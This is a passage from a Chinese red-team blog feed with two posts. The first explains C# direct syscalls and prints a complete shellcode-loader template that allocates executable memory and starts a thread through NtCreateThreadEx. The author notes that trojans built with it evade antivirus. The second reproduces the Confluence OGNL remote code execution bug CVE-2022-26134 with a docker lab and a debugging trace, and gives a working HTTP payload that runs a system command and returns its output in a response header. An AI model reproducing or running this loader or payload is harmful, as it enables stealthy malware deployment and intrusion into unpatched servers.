是存有对某个方法的引用的一种引用类型变量。引用可在运行时被改变。委托（Delegate）特别用于实现事件和回调方法。所有的委托（Delegate）都派生自 System.Delegate 类。参考链接：https://cloud.tencent.com/developer/article/1798625https://www.runoob.com/csharp/csharp-delegate.html</code></pre><p>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><pre><code>UnmanagedFunctionPointer控制作为非托管函数指针传递给非托管代码或从非托管代码传递的委托签名的封送处理行为。这个类不能被继承。https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.unmanagedfunctionpointerattribute.-ctor?view=net-6.0#system-runtime-interopservices-unmanagedfunctionpointerattribute-ctor(system-runtime-interopservices-callingconvention)CallingConvention.StdCal 被调用者清理堆栈。属于调用约定枚举里面的参数https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.callingconvention?view=net-6.0</code></pre><p><strong>写死的syscall示例代码1</strong></p><pre><code class="csharp">static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }public struct Delegates        {                    &lt;省略&gt;            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);</code></pre><p><strong>示例代码2</strong></p><pre><code class="csharp">using System;using System.ComponentModel;using System.Diagnostics;using System.Runtime.InteropServices;using static Syscall.Native;namespace Syscall{    class Syscalls    {        /*        MSDN:        NTSTATUS NtAllocateVirtualMemory(            HANDLE ProcessHandle,         // C#: IntPtr            PVOID* BaseAddress,           // C#: IntPtr            ULONG_PTR ZeroBits,           // C#: IntPtr            PSIZE_T RegionSize,           // C#: ref UIntPtr            ULONG AllocationType,         // C#: UInt32            ULONG Protect                 // C#: UInt32            );        ReactOS:        NTSTATUS NtAllocateVirtualMemory(            _In_ HANDLE ProcessHandle,            _Inout_ _Outptr_result_buffer_(* RegionSize) PVOID *BaseAddress,            _In_ ULONG_PTR ZeroBits,            _Inout_ PSIZE_T RegionSize,            _In_ ULONG AllocationType,            _In_ ULONG Protect            ); */        /*   0x18 in all Windows 10 version so far   */        static byte[] bNtAllocateVirtualMemory =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x18, 0x00, 0x00, 0x00,   // mov eax,18h            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtAllocateVirtualMemory(            IntPtr ProcessHandle,            ref IntPtr BaseAddress,            IntPtr ZeroBits,            ref UIntPtr RegionSize,            uint AllocationType,            uint Protect )        {            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall            byte[] syscall = bNtAllocateVirtualMemory;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtAllocateVirtualMemory                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));                    return (NTSTATUS)assembledFunction(                        ProcessHandle,                        ref BaseAddress,                        ZeroBits,                        ref RegionSize,                        AllocationType,                        Protect);                }            }        }        // https://securityxploded.com/ntcreatethreadex.php        //NTSTATUS NtCreateThreadEx(            // OUT PHANDLE hThread,                         // C#: out IntPtr            // IN ACCESS_MASK DesiredAccess,                // C#: ACCESS_MASK (Native.cs)            // IN LPVOID ObjectAttributes,                  // C#: IntPtr.Zero            // IN HANDLE ProcessHandle,                     // C#: IntPtr            // IN LPTHREAD_START_ROUTINE lpStartAddress,    // C#: IntPtr            // IN LPVOID lpParameter,                       // C#: IntPtr            // IN BOOL CreateSuspended,                     // C#: Boolean/Int            // IN ULONG StackZeroBits,                      // C#: uint            // IN ULONG SizeOfStackCommit,                  // C#: uint            // IN ULONG SizeOfStackReserve,                 // C#: uint            // OUT LPVOID lpBytesBuffer                     // C#: IntPtr            // );        /*   Windows 10 1909: 0xBD, Windows 10 2004: 0xC1   */        static byte[] bNtCreateThreadEx =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx        //    0xb8, 0xc1, 0x00, 0x00, 0x00,   // mov eax,0BDh            0xb8, 0xbd, 0x00, 0x00, 0x00,   // mov eax,0BDh            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtCreateThreadEx(            out IntPtr hThread,            ACCESS_MASK DesiredAccess,            IntPtr ObjectAttributes,            IntPtr ProcessHandle,            IntPtr lpStartAddress,            IntPtr lpParameter,            bool CreateSuspended,            uint StackZeroBits,            uint SizeOfStackCommit,            uint SizeOfStackReserve,            IntPtr lpBytesBuffer            )        {            // set byte array of bNtCreateThread to new byte array called syscall            byte[] syscall = bNtCreateThreadEx;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtCreateThread                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));                    return (NTSTATUS)assembledFunction(                        out hThread,                        DesiredAccess,                        ObjectAttributes,                        ProcessHandle,                        lpStartAddress,                        lpParameter,                        CreateSuspended,                        StackZeroBits,                        SizeOfStackCommit,                        SizeOfStackReserve,                        lpBytesBuffer                        );                }            }        }        /*        MSDN:        NTSTATUS ZwWaitForSingleObject(            HANDLE Handle,             // C#: IntPtr            BOOLEAN Alertable,         // C#: Boolean            PLARGE_INTEGER Timeout     // C#: Int64            );        ReactOS:        NTSTATUS NtWaitForSingleObject(             In_ HANDLE Object,             In_ BOOLEAN Alertable,             In_opt_ PLARGE_INTEGER Time             ); */        /*   0x4 in all Windows 10 versions so far   */        static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }        public struct Delegates        {            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtAllocateVirtualMemory(                IntPtr ProcessHandle,                ref IntPtr BaseAddress,                IntPtr ZeroBits,                ref UIntPtr RegionSize,                ulong AllocationType,                ulong Protect);            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtCreateThreadEx(                out IntPtr hThread,                ACCESS_MASK DesiredAccess,                IntPtr ObjectAttributes,                IntPtr ProcessHandle,                IntPtr lpStartAddress,                IntPtr lpParameter,                bool CreateSuspended,                uint StackZeroBits,                uint SizeOfStackCommit,                uint SizeOfStackReserve,                IntPtr lpBytesBuffer                );            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);        }    }}</code></pre><p>NtAllocateVirtualMemory示例代码<br>不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><pre><code class="csharp">       public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID)); //先获取SyscallID的内存大小 再分配内存                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID)); //用0填充内存                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;); //获取ntdll基址                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName); //获取API函数地址                     IntPtr CallAddr = FunAddr + 4; //获取系统调用编号地址                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp); //读取内存编号                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem); //从非托管内存中读取 32 位有符号整数。支持从未对齐的内存位置读取 (相当于转成int)                     return SyscallID; //返回内存编号        }             public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,          // 0x4c, 0x8b, 0xd1=mov r10,rcx、 0xb8=mov eax            0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,   // 0x0F, 0x05=syscall、0xc3=ret            0x0F, 0x05,                                0xC3                                   };public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray(); //拼接syscall汇编指令                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloDoj.png" alt=""></p><p>API Syscall声明-执行shellcode整套完整模板  - 来源代码：<a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p><pre><code class="csharp">using System;using System.Collections.Generic;using System.Linq;using System.Runtime.InteropServices;using System.Text;using System.Threading.Tasks;using System.Runtime.InteropServices;using System.ComponentModel;using System.Diagnostics;namespace SysCall_ShellcodeLoad{    class Auto_NativeCode    {              [DllImport(&quot;kernel32.dll&quot;)]              public static extern bool VirtualProtectEx              (                     IntPtr hProcess,                     IntPtr lpAddress,                     UIntPtr dwSize,                     uint flNewProtect,                     out uint lpflOldProtect               );              [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true,  SetLastError = true)]              static extern IntPtr GetProcAddress(IntPtr hModule, string  procName);              [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]              public static extern IntPtr GetModuleHandle(string lpModuleName);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              public static extern IntPtr GetCurrentProcess();              [DllImport(&quot;kernel32.dll&quot;)]              public static extern void RtlZeroMemory(IntPtr pBuffer, int length);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              static extern bool ReadProcessMemory(                     IntPtr hProcess,                     IntPtr lpBaseAddress,                     IntPtr lpBuffer,                     int dwSize,                     out uint lpNumberOfBytesRead              );              public uint NTSTATUS;              public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;              // public uint SYSid = 0;              public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,                           0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,              0x0F, 0x05,                                0xC3                                   };              public enum AllocationType : ulong              {                     Commit = 0x1000,                     Reserve = 0x2000,                     Decommit = 0x4000,                     Release = 0x8000,                     Reset = 0x80000,                     Physical = 0x400000,                     TopDown = 0x100000,                     WriteWatch = 0x200000,                     LargePages = 0x20000000              }              public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID));                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID));                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;);                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName);                     IntPtr CallAddr = FunAddr + 4;                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp);                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem);                     Console.WriteLine(&quot;SyscallID:{0:x}&quot;,SyscallID);                     return SyscallID;        }              public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }              public static uint NtCreateThreadEx           (                  out IntPtr hThread,                  uint DesiredAccess,                  IntPtr ObjectAttributes,                  IntPtr ProcessHandle,                  IntPtr lpStartAddress,                  IntPtr lpParameter,                  bool CreateSuspended,                  uint StackZeroBits,                  uint SizeOfStackCommit,                  uint SizeOfStackReserve,                  IntPtr lpBytesBuffer           )              {                     // set byte array of bNtCreateThread to new byte array called  syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtCreateThreadEx&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtCreateThread                                  DelegatesStruct.NtCreateThreadEx  assembledFunction =  (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));                                  return (uint)assembledFunction(                                         out hThread,                                         DesiredAccess,                                         ObjectAttributes,                                         ProcessHandle,                                         lpStartAddress,                                         lpParameter,                                         CreateSuspended,                                         StackZeroBits,                                         SizeOfStackCommit,                                         SizeOfStackReserve,                                         lpBytesBuffer                                   );                           }                     }              }              public static uint NtWaitForSingleObject(IntPtr Object, bool  Alertable, uint Timeout)              {                     // set byte array of bNtWaitForSingleObject to new byte array  called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtWaitForSingleObject&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtWaitForSingleObject                                  DelegatesStruct.NtWaitForSingleObject  assembledFunction =  (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));                                  return (uint)assembledFunction(Object,  Alertable, Timeout);                           }                     }              }              public struct DelegatesStruct              {                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtAllocateVirtualMemory(                           IntPtr ProcessHandle,                           ref IntPtr BaseAddress,                           IntPtr ZeroBits,                           ref UIntPtr RegionSize,                           ulong AllocationType,                           ulong Protect);                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtCreateThreadEx(                           out IntPtr hThread,                           uint DesiredAccess,                           IntPtr ObjectAttributes,                           IntPtr ProcessHandle,                           IntPtr lpStartAddress,                           IntPtr lpParameter,                           bool CreateSuspended,                           uint StackZeroBits,                           uint SizeOfStackCommit,                           uint SizeOfStackReserve,                           IntPtr lpBytesBuffer                           );                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtWaitForSingleObject(IntPtr Object,  bool Alertable, uint Timeout);              }       }}</code></pre><p>最后就是实现shellcode执行，按照C翻译就行。或者CV<br><img src="https://s1.ax1x.com/2022/11/22/zlo6Wq.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/11/22/zlogS0.png" alt=""></p><p>在项目里面用这个模板做的几个马，免杀效果都不错<br><img src="https://s1.ax1x.com/2022/11/22/zlo2lV.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-1/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-1/</a><br><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-2/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-2/</a><br><a href="https://www.solomonsklash.io/syscalls-for-shellcode-injection.html" target="_blank" rel="noopener">https://www.solomonsklash.io/syscalls-for-shellcode-injection.html</a><br><a href="https://github.com/SolomonSklash/SyscallPOC" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC</a><br><a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近打了两个项目，大多数笔记都更新在星球了。想起来，很久没写博客了，更新一下&lt;br&gt;最近研究了一下C#的syscall，记录一下&lt;br&gt;&lt;i</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-26134 Confluence OGNL RCE 漏洞复现</title>
    <link href="http://jiushill.github.io/posts/9c6a5f14.html"/>
    <id>http://jiushill.github.io/posts/9c6a5f14.html</id>
    <published>2022-08-12T16:12:54.000Z</published>
    <updated>2022-08-12T16:31:12.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>Confluence Server and Data Center &gt;= 1.3.0<br>Confluence Server and Data Center &lt; 7.4.17<br>Confluence Server and Data Center &lt; 7.13.7<br>Confluence Server and Data Center &lt; 7.14.3<br>Confluence Server and Data Center &lt; 7.15.2<br>Confluence Server and Data Center &lt; 7.16.4<br>Confluence Server and Data Center &lt; 7.17.4<br>Confluence Server and Data Center &lt; 7.18.1</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境</p><pre><code>docker-compose.ymlversion: &#39;2&#39;services:  web:    image: vulhub/confluence:7.13.6    ports:      - &quot;8090:8090&quot;      - &quot;5050:5050&quot;    depends_on:      - db  db:    image: postgres:12.8-alpine    environment:    - POSTGRES_PASSWORD=postgres    - POSTGRES_DB=confluence</code></pre><p>docker搭好后<br><img src="https://s1.ax1x.com/2022/08/13/vY5EOU.png" alt=""></p><p>搭建好之后还需要去注册账号获取临时KEY来激活<br>参考链接：<a href="https://www.modb.pro/db/431731" target="_blank" rel="noopener">https://www.modb.pro/db/431731</a></p><p>安装过程<br><img src="https://s1.ax1x.com/2022/08/13/vY5KYR.png" alt=""></p><p>安装成功后<br><img src="https://s1.ax1x.com/2022/08/13/vY52kj.png" alt=""></p><p>在容器中/opt/atlassian/confluence/bin目录下修改setenv.sh文件，加入远程调试配置。</p><pre><code>CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050 ${CATALINA_OPTS}&quot;</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vY5Whn.png" alt=""></p><p>进入容器后将/opt/atlassian目录下的confluence源码使用docker cp命令复制到本地。<br>使用IDEA将/confluence/WEB-INF下的atlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件拉取为依赖文件<br><img src="https://s1.ax1x.com/2022/08/13/vY5410.png" alt=""></p><p>idea远程调试设置<br><img src="https://s1.ax1x.com/2022/08/13/vY55cV.png" alt=""></p><p>之后在com/opensymphony/webwork/dispatcher/ServletDispatcher.class第85行下断点(service函数)<br><img src="https://s1.ax1x.com/2022/08/13/vY5TnU.png" alt=""></p><p>为什么在ServletDispatcher下断点？运维所有的.action最后的servlet指向了，com.atlassian.confluence.servlet.ConfluenceServletDispatcher类，而ConfluenceServletDispatcher继承了ServletDispatcher<br><img src="https://s1.ax1x.com/2022/08/13/vY5qAJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/08/13/vY5v1x.png" alt=""></p><h2 id="动态调试过程"><a href="#动态调试过程" class="headerlink" title="动态调试过程"></a>动态调试过程</h2><p>1.com/opensymphony/webwork/dispatcher/ServletDispatcher调用com/atlassian/confluence/servlet/ConfluenceServletDispatcher.classserviceAction函数<br><img src="https://s1.ax1x.com/2022/08/13/vY5zjK.png" alt=""></p><p>2.创建一个hash表把传进的全部作为hash表默认值，变量名为extraContext<br>3.put变量名为com.opensymphony.xwork.dispatcher.ServletDispatcher，值是自身对象<br>4.调用DefaultActionProxy里的createActionProxy传入namespace，actionName,extraContext 变量名为proxy<br>5.调用proxy的execute函数<br><img src="https://s1.ax1x.com/2022/08/13/vYICHe.png" alt=""><br><img src="https://s1.ax1x.com/2022/08/13/vYIFNd.png" alt=""></p><p>DefaultActionProxy里的execute函数<br>1.获取ActionContext对象实例 （DefaultActioninvocation）<br>2.调用该对象的invoke函数<br><img src="https://s1.ax1x.com/2022/08/13/vYIk4A.png" alt=""></p><p>DefaultActioninvocation invoke函数<br>1.遍历this.interceptors.hasNext() hash表 （该hash表存着所有类对象）<br>2.当resultCode为notpermitted时，退出循环<br><img src="https://s1.ax1x.com/2022/08/13/vYIZgP.png" alt=""></p><p>6.进入到ActionChainResult类里的execute函数<br>7.this.namespace为我们传入的payload<br>8.OgnlValueStack stack变量获取OgnlValueStack对象<br>9.将stack和this.namespace传入TextParseUtil.translateVariables函数<br><img src="https://s1.ax1x.com/2022/08/13/vYI14s.png" alt=""></p><p>translateVariables函数<br>1.正则提取ONGL表达式<br>2.调用OgnlValueStack.findValue函数传入ONGL表达式 复制变量object o<br>3.执行完后返回内容<br><img src="https://s1.ax1x.com/2022/08/13/vYI8Cn.png" alt=""></p><p>OgnlValueStack.findValue函数<br>最后调用findValue函数对表达式进行解析<br><img src="https://s1.ax1x.com/2022/08/13/vYIJg0.png" alt=""><br>(不知道是不是远程调试的问题，这里断点o没返回执行命令的结果，文章里有）<br><img src="https://s1.ax1x.com/2022/08/13/vYIwE4.png" alt=""></p><h2 id="payload刨析"><a href="#payload刨析" class="headerlink" title="payload刨析"></a>payload刨析</h2><pre><code>GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: 192.168.3.88:8090Cache-Control: max-age=0DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=EA0CD27EDE8E10DD40A744E51514CB5FConnection: close</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vYIygx.png" alt=""></p><p>payload刨析<br>1.定义a变量调用Runtime.exec执行命令<br>2.将执行命令结果设置到返回头X-Cmd-Response</p><pre><code>//${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/</code></pre><p>出处Y4er的博客 <a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" 